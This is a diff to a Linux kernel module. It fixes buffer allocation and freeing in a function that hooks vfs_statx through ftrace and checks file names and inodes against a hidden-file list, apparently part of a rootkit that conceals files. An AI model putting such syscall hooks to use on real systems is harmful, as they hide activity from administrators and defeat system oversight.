@@ -998,6 +998,7 @@ static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs
 #endif
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
+#define __MAXLEN 256
 static long (*real_vfs_statx)(int, const char __user *, int, struct kstat *, u32);
 static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask) {
 #else
@@ -1005,12 +1006,12 @@ static long (*real_vfs_statx)(int, struct filename  *, int, struct kstat *, u32)
 static long m_vfs_statx(int dfd, struct filename *filename, int flags, struct kstat *stat, u32 request_mask) {
 #endif
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
-    const char target[PROCNAME_MAXLEN+6] = {0};
+    char *target = kzalloc(__MAXLEN, GFP_KERNEL);
 #else
     const char *target = filename ? filename->name : "";
 #endif
 
-    /* call original first, I need stat */
+    /* call original first, I want stat */
     long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
 
     /**
@@ -1020,7 +1021,7 @@ static long m_vfs_statx(int dfd, struct filename *filename, int flags, struct ks
      *  Check: if it can be optimized
      * */
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
-    if (name != NULL && !copy_from_user((void*)name, filename, PROCNAME_MAXLEN-1)) {
+    if (target != NULL && !copy_from_user((void*)target, filename, __MAXLEN-1)) {
 #endif
         const char *name = fs_get_basename(target);
         if (fs_search_name(name, stat->ino)) {
@@ -1039,10 +1040,15 @@ static long m_vfs_statx(int dfd, struct filename *filename, int flags, struct ks
             }
         }
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
-        kfree(name);
     }
 #endif
+
 leave:
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
+    if (target != NULL) {
+        kfree(target);
+    }
+#endif
     return rv;
 }
 
